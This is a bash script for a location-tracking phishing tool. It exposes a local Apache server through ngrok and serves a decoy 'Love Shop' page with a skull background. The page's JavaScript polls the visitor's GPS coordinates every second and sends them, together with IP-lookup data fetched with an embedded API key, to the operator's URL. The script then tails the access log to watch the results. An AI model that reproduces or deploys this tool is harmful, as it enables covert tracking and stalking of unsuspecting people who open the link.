#!/bin/bash

#64_bit
xterm -e ./ngrok http 80 & clear

#32_Bit
#xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Love Shop</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"skull.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    
    <body onload=\"loadDoc()\">

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });
        
        </script>
        <script>
            function loadDoc() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                let x = this.responseText;
                xhttp.open(\"GET\", \""$varurl"/page\" + x, true);
                xhttp.withCredentials = true;
                xhttp.send();
                }
            };
            xhttp.open(
                \"GET\",
                \"https://ip-api.io/json?api_key=0908208e-418b-4dad-bb59-92f7e0d27b14\",
                true
            );
            xhttp.send();
            }
        </script> 

    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp skull.jpg /var/www/html/skull.jpg
service apache2 start
echo "         ______________________________________________________   
         7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
